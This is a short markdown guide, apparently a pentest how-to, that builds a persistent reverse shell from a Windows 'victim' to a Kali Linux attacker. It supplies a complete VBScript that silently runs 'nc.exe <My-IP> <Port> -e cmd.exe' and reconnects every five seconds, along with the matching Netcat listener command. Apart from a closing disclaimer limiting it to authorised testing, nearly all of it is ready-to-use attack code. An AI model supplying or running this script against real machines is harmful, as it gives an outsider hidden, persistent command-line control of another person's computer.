# Reverse Shell Using Netcat and VBScript

This guide explains how to set up a **reverse shell** from a **Windows victim machine** to a **Kali Linux attacker machine** using **Netcat** (`nc.exe`). The connection will be maintained and automatically re-established if lost, using a **VBScript** that checks the connection every 5 seconds.

---

## Prerequisites

- **Netcat (`nc.exe`)**: A simple, reliable tool to establish reverse shells.
- **VBScript**: A script that will monitor and reconnect the reverse shell every 5 seconds.
- **Windows Victim Machine**: The target machine that will execute the reverse shell.
- **Kali Linux Attacker Machine**: The machine that listens for the incoming reverse shell connection.

---

## Workflow

### Step 1: Prepare `nc.exe` on the Attacker Machine

1. On your **Kali Linux** machine, navigate to the directory where you want to store the **Netcat executable** (`nc.exe`):

    ```bash
    cp /usr/share/windows-resources/binaries/nc.exe .
    ```

    This copies the `nc.exe` binary to your current directory.

---

### Step 2: Create the VBScript for Reconnection

2. On the **Windows victim machine**, create a new file named `reconnect.vbs` in the same directory where `nc.exe` is located.

3. Open **Notepad**, and paste the following VBScript code:

```vbscript
Set objShell = CreateObject("WScript.Shell")

Do
    ' Replace <My-IP> with your IP address and <Port> with your desired port number
    objShell.Run "cmd.exe /c nc.exe <My-IP> <Port> -e cmd.exe", 0, True
    WScript.Sleep 5000 ' Wait for 5 seconds before retrying
Loop
```

4. **Save the file** as `reconnect.vbs`.

    - Replace `<My-IP>` with your **Kali Linux machine's IP address**.
    - Replace `<Port>` with the port number you want to use for the reverse shell (e.g., `4444`).

---

### Step 3: Set Up the Listener on Kali Linux

5. On your **Kali Linux** machine, run the following command to set up the **Netcat listener** on the desired port:

    ```bash
    nc -lvnp <Port>
    ```

    Replace `<Port>` with the port number specified in the VBScript.

---

### Step 4: Execute the Reverse Shell on the Victim Machine

6. On the **Windows victim machine**, **double-click** the `reconnect.vbs` file to run the script. The script will:

   - Execute the `nc.exe` reverse shell, which connects back to your Kali machine at the specified IP and port.
   - If the connection is lost, the script will automatically attempt to reconnect every 5 seconds.

---

### Step 5: Interaction with the Reverse Shell

7. Once the connection is established, you'll have access to the **Windows CMD shell** of the victim machine. You can interact with it through the Netcat listener on your **Kali machine**.

### Legal Disclaimer

This reverse shell guide is intended for **ethical hacking** and **authorized penetration testing** only. Unauthorized access to computer systems is illegal and unethical. Always obtain explicit written permission before conducting any tests or activities that could impact a network or system.
